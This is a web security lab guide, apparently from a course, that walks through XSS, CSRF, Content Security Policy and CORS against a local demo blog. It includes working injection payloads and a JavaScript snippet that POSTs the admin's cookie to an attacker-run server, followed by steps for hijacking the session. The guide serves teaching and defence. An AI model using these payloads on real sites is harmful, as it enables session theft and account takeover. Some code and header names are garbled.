# XSS and CORS

## Environment setup

After setting the app, installing the requirments, etc. We open the browser one in normal mode and
the other in incognito mode. The Admin will be in the normal and the attacker in the incognito.
We will know proceed into making a couple of attacks to the website.

Access the site in the URL **http://aula3:6543**

## Cross-Site Scripting

### Reflected XSS Attack

In this type of attack it is assumed that the attack is non-persistent. With this attack it becomes
possible to manipulate the browser Document Object Model (DOM) for a single user, or multiple which
access a page through the same specially crafted **URL** depicts a typical scenario.

#### How to do it in our Website:

Using the Blog Search bar, which searches directly using the website, we can pass:
```
<script>alert("You are under attack")</script>
```
Because we are passing a script tag, the site will interpert it as being part of the code and will
execute it (alert is not the best for attackers but shows well what happens).

URL generated: `http://aula3:6543/search?q=%3Cscript%3Ealert%28%22You+are+under+attack%22%29%3C%2Fscript%3E`

### Stored XSS Attack

It allows an attacker to place malicious script (Javascript) into a webpage. Victms that
access the website will render all the scripts, including the injected one.
Common in a place where the information is shared between users through web technologies
(e.g. forums and blogs).This way the attacker composes a message, hides some script in its source
code, and puts it in place, which is accessed by a victim. All users visiting that place would
execute the exploit.
There are 2 types of **Stored XSS Attack**, **Server Side** and **Client Side**.

#### Server Side

The payload must be included in the web page when the page is built by the server.

#### Client Side

Loads dynamic content into the web page using JS. `<script>` tags are not evaluated directly,
but JS can be included in objects event handlers (e.g. onload, onclick).

#### How to do it in our Website:

* Server Side:
As we can see in our website there is a place where people can comment on a blog. This comment
is stored in the code and loads when the page loads.
The name tag does not let us execute a XSS atack but the comment does.
We put whtever name we want and make a comment like:
```
<script>alert("Loading Virus...")</script>
```
Every user that loads the page will receive this alert.

* Client Side:

Using the same principle as the last one, but using a `<button>` yag this time, we can execute
a Client Side attack.
On the comment put:
```
<button type="button" onclick="alert('You should not have clicked!')">Click Me!</button>
```
Once again any user that cicks the button will suffer the exploit.

### CSRF Attack

The Cross-Site Request Forgery, CSRF, attack consists in injecting code that, using the
credentials and capabilities of the browser viewing a given object, may attack another
system. This attack can be used for simple Denial of Service (DoS) or Distributed Denial
of Service (DDoS), tracking users, or invoke requests on systems with the identity of
the victim.

This exploits the fact that, for usability, functionality, and performance purposes,
systems cache authentication credentials in small tokens named **cookies**.
When a user accesses a service, such as a social sharing application,
or a Online Banking solution, a session is initialized, and will be kept valid for a long
period. Even if the user abandons the webpage. However, if the user visits another page
which has a CSRF exploit, targeting the first page, it is possible to invoke services
using the user identity, without his knowledge. This attack is frequently don using the
`<img>` tag, however other tags can be used.

As an example, consider that a forum post contains the following content:
```
Totally legit message :)
<img src='https://vulnerable-bank.com/transfer.jsp?amount=1000&to_nib=12345300033233'></img>
```
When the browser tries to load the image, it will invoke an action to an external server.
In this hypothetical case, it would transfer funds from the victims bank account to the
attacker's bank account.

Sometimes a more complex interaction is required, and the attack will actually inject JS code:
```
$.ajax({
url: 'http://external:8000/cookie',
type: 'POST',
data: "username=Administrator&cookie=" + document.cookie,
});
```

#### Exercise:
-	1) Navigate to the directory where we dumped our downloaded package
-	2) Run the script **hacker_server.py**
-	3) Do a POST to **http://localhost:8000**

This script will dump to **stdout** all data that is posted to it (using HyperText
Transfer Protocol (HTTP) POST).

Following the last exercise, we already know that we can inject  `<script>` tags
into a post's page by creating a comment and putting some code into the
Description field. So, by including the following code into the comment:
```
<script>
	$.ajax({
	        url: 'http://localhost:8000/cookie',
		type: 'POST',
		data: "username=Administrator;cookie=a"+document.cookie,
	})
</script>
```

As we can see in the running **hacker_server** we have received the Administrator
Session Cookie.
Now we can use the value given to enter in the Administrator account.
Open Inspect mode, go to Storage and then Cookie's tab, change the name to **auth_tkt** (as given)
and cookie to the given value in the hacker server console.

## Content Security Policy

It is a way to protect a website from injection of malicious code. This does not stop all types of
XSS, but it is on of the most important steps. For more protection it should be combined with CORS,
described in the next section.

The objective is to define what content can be present in the HTML, or how it is handled by the
browser. HTML Content Policy makes use of the headers that specify how the browser should load
and execute resources. The most important is **Content-Security-Policy**, which specifies a set
of rules for content. **content-security-policy.com**

To see this in action, lets consider an example where we define all JS should be loaded from the
web page server, and no JS objects are allowed from external sites, or only from a restricted
set. For this purpose, we can set the **Content-Security-Protocol** to: **default-script 'self'
cdn.jsdeliivr.net**

With this value, scripts will only be loaded from the local server or cdn.jsdelivr.net a known Content Delivery Network.

#### Exercise:

To enable Content Security Policy in the server by removing the comment in line 63 of file xss_demo/views.py and restarting the server. This will just call a function that is written a few lines before this line.
If we now try to inject payloads that load scripts from external sites.

Further rules could be added so that no script is added inline, no images are loaded from external sites, all
resources are loaded from secure locations, etc . . .

We will comment it again to continue the guide.

### Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell a browser
to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, and port) than its own origin. 

In the previous exercises, several payload that load resources from external locations could be injected. If
CORS is properly setup, the browser will not load resources from external sites, or only load resources from
selected sites. This effectively can be used to limit cross site request forgery and most cross site scripting
attacks.

The CORS specification states that many resources will be affected, and can effectively be prevented from loading. This includes images, fonts, textures, and any other resource, as well as scripts and even calls made inside Javacript scripts.
Requests can be considered to be of two types: Simple and Preflight. The type of request is defined by the method, headers, destination and several other aspects. depicts the flow used by the browser to select how to handle each request.

#### Exercise:
* To setup:
Inside the *scripts* directory there is a second server: **cors_server.py**.
The additional server will simulate a service being exploited by a XSS attack, such as
a website for a shop or a bank. The blog software we used previously will remain our method of invoking
remote resources.
Start the site.

Now lets inject payloads as messages in the app's posts' comments in order to test the diﬀerent paths in the CORS ﬂow. 
We can observe what is loaded by looking at the browser console, and the server console. Take in consideration that the browser may issue background requests that are not displayed in the network view, but logged by the server!

The following snippet can be used to simulate different requests from within JS.
```
$.ajax({
<script>
    $.ajax({
    url: 'http://external:8000/smile.jpg',
    type: 'GET',
    success: function() { alert("smile.jpg loaded"); },
    });
</script>
```
In the browser console, it received a log:
```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://external:8000/smile.jpg. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). Status code: 200.
```

And the server console received:
```
127.0.0.1 - - [08/Oct/2023 04:52:29] "GET /smile.jpg HTTP/1.1" 200 -
Serving file: smile.jpg
Request Debug:  GET
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://aula3:6543
Connection: keep-alive
Referer: http://aula3:6543/
```

The reson that the firs log appears is because the **external** server doesn’t allow the resources to be shared (loaded) from other web sites. This will avoid indirect
calls from users that were tricked with some XSS payload.

Because we are dealing with images, they do not pose a threat, and we can actually allow these resources to be obtained. In order to do this, we can add a **header Access-Control-Allow-Origin** stating that every website can include the images. Check the file *header Access-Control-Allow-Origin* and uncomment the code around line 20. Then repeat the previous tests.

One of the tests still went wrong. This is because a GET with additional headers can be used to trigger
authenticated actions (user authentication uses headers). Therefore, the browser will first check if the request can be made by issuing a OPTIONS request. The result of this request should be the access policy (Access-Control-Allow-Origin), and the list of methods supported (Access-Control-Allow-Methods with each method separated by a comma).

In the cors_server.py file, add a method named do_OPTIONS(self), which returns the correct headers enabling users
to GET images.


